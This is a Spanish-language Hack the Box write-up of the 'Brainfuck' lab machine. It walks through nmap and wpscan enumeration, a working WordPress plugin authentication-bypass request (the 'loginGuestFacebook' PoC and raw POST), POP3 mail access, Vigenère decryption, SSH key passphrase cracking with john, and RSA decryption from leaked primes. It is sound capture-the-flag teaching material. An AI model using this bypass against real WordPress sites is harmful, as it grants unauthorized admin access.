---
layout: single
title: Brainfuck - Hack the Box (Español)
date: 2021-05-12
classes: wide
header:
  teaser: /assets/images/brainfuck-writeup/brainfuck_logo.jpg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - HTB
  - hash
  - criptografia
  - wordpress
---

Brainfuck es una maquina especializada para aprender a explotar wordpress a traves de sus diferentes vulnerabilidades en los plugins y tambien poner a prueba temas de criptografia basica como por el ejemplo el cifrado polialfabetico y llega hasta temas como RSA.


### Escaneo

Escaneamos los puertos de la maquina :

```
> nmap -p- 10.10.10.17

PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
110/tcp open  pop3
143/tcp open  imap
443/tcp open  https
```

Buscamos las versiones de estos servicios y contenido extra a traves de los scripts de nmap :

```
> nmap -sC -sV -p22,25,110,143,443 10.10.10.17

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE RESP-CODES PIPELINING TOP CAPA USER UIDL
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: AUTH=PLAINA0001 ID IDLE IMAP4rev1 have OK capabilities post-login SASL-IR more listed LITERAL+ ENABLE LOGIN-REFERRALS Pre-login
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Lo primero que nos deberia llamar la atencion seria el puerto 443 que tiene un Subject Alternative Name lo que significa que esta compartiendo un solo certificado para varios subdominios, entonces para resolver estos subdominios los agregamos a nuestro /etc/hosts de esta manera :

```
10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
```



usuario encontrado en brainfuck.htb :

![smtpinfo](/assets/brainfuck-writeup/smtp_comment_info.png)

orestis@brainfuck.htb

Con wappalyzzer podemos identificar que se esta usando un Wordpress 4.7.3, por lo que primero usamos wpscan para saber si podemos identificar algo mas :

```
> wpscan --url 'https://brainfuck.htb' --disable-tls-check -e u

[i] Plugin(s) Identified:
 |
[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Version: 7.1.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/read
 |
[i] User(s) Identified:
[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

### Explotacion

Identificamos plugin que es posiblemente explotable wp-support-plus-responsive-ticket-system e identificamos dos nombres de usuarios mas  : admin, administrator.

Bucamos posibles vulnerabilidades del plugin :

![](/assets/images/brainfuck-writeup/wp_support_ticket_vulns.png)

PoC de la vulnerabilidad : 

```
<form method="post" action="http://wp/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="administrator">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```

Basicamente tenemos que enviar un POST a esa direccion con los valores que tenemos, por lo que encendemos nuestro burp hacemos cualquier peticion hacia la url de https://brainfuck.htb y cambiamos esa peticion por esta :

![](/assets/images/brainfuck-writeup/request_wp_admin.png)

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: brainfuck.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
DNT: 1
Connection: close
Cookie: wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1

username=admin&email=orestis%40brainfuck.htb&action=loginGuestFacebook
```

Nos logueamos como admin e inspeccionamos el sitio.

Encontramos la contraseña de orestis en la seccion de configuracion de SMTP :

![](/assets/images/brainfuck-writeup/pass_smtp.png)

inspeccionamos el codigo fuente y podemos ver la contraseña en claro.

Por lo que nos conectamos a smtp para inspeccionar los correos recibidos por orestis :

```
nc -nv 10.10.10.17 110
(UNKNOWN) [10.10.10.17] 110 (pop3) open
+OK Dovecot ready.
USER orestis
+OK
PASS kHGuERB29DNiNE
+OK Logged in.
list
+OK 2 messages:
1 977
2 514
.
retr 2
+OK 514 octets
Return-Path: <root@brainfuck.htb>
X-Original-To: orestis
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 0)
	id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: Forum Access Details
Message-Id: <20170429101206.4227420AEB@brainfuck>
Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
From: root@brainfuck.htb (root)

Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
.
```

Encontramos credenciales de orestis, que es para el foro secreto por lo que intuyo que es para "sup3rs3cr3t.brainfuck.htb".

Ahora una vez ingresamos al foro encontramos mas hilos entre el admin y orestis, este foro es sumamente interesante ya que indica que el admin le pasara la clave para loggearse por ssh a orestis en otro hilo.

![](/assets/images/brainfuck-writeup/ssh_access.png)



Revisamos el foro encriptado :

![](/assets/images/brainfuck-writeup/key_access.png)

Ahora para identificar el tipo de cifrado que se usa en este foro revise esta linea :

```
mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr
```

Tiene forma de url y en si parece que es una url, por lo que las 5 primeras letras deberian ser https pero al haber dos letras t nos podemos dar cuenta que no es un cifrado de sustitucion monoalfabetico por que las dos t deberian tener el mismo valor cifrado si fuera un cifrado de sustitucion monoalfabetico, por lo que deberia ser un cifrado de sustitucion polialfabetico.

```
m n v z e
h t t p s
```

El cifrado de sutitucion polialfabetico mas conocido es el cuadro de vignere ahora en caso de que fuera ese tipo de cifrado tenemos que encontrar una key para descifrar los mensajes.

En este caso usamos esta herramienta :

<https://github.com/x0pr4nt3s/vigenere_decrypt_with_key>

```
> python3 vigenere.py 'Qbqquzs-Pnhekxsdpifcafhfzdmgzt' 'Orestis-Hackingforfunandprofit'

Resultado : 
CkmybraAInfuckmybrainfuckmybra
```

Con esto identificamos que la clave es 'FUCKMYBRAIN', ahora con esto intentemos descifrar la url :

```
> python3 vigenere.py 'mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr' 'FUCKMYBRAIN'

Resultado : 
https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

Con esto obtenemos el id_rsa de orestis. Ahora copiamos id_rsa  a un formato que john the ripper pueda leer para asi obtener el passphrase  :

```
> python3 ssh2john.py id_rsa > hash
```

Nota : instale ssh2john de [aqui](https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py)

Listo ahora aplicamos fuerza bruta para obtener el passphrase con :

```
> john --wordlist=/usr/share/wordlists/rockyou.txt hash

	Resultado : 3poulakia! 
```

Ya estamos dentro!!!

```
orestis@brainfuck:~$ cat user.txt 
************73ac15a3310bd097c9
```

### Privesc

ya dentro nos encontramos con esto :

```python
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

Este archivo esta leyendo el contenido de root.txt y lo esta encriptando. Dentro de orestis/debug.txt tenemos los valores de p,q,e y tenemos el texto cifrado en output.txt.

Investigando el codigo en google identificamos que es un algoritmo RSA estandar por lo que investigamos una manera de desencriptarlo y encontramos este codigo :

```python
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 1090660992520643446103273789680343
    q = 1162435056374824133712043309728653
    e = 65537
    ct = 299604539773691895576847697095098784338054746292313044353582078965

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()
```

Colocamos cada una de las partes que nos dan los archivos debug.txt y output.txt en p,q,e y ct respectivamente, esto nos dara un valor en decimales por lo que tenemos que pasarlo a hexadecimal y por ultimo a binario 

```
root.txt: 6efc1a5d****************
```


### Referencias

 - https://www.digicert.com/faq/subject-alternative-name.htm
 - http://www.dma.fi.upm.es/recursos/aplicaciones/matematica_discreta/web/aritmetica_modular/polialfabeto.html
 - https://es.wikipedia.org/wiki/RSA
 - https://ctftime.org/writeup/6434
 - https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e

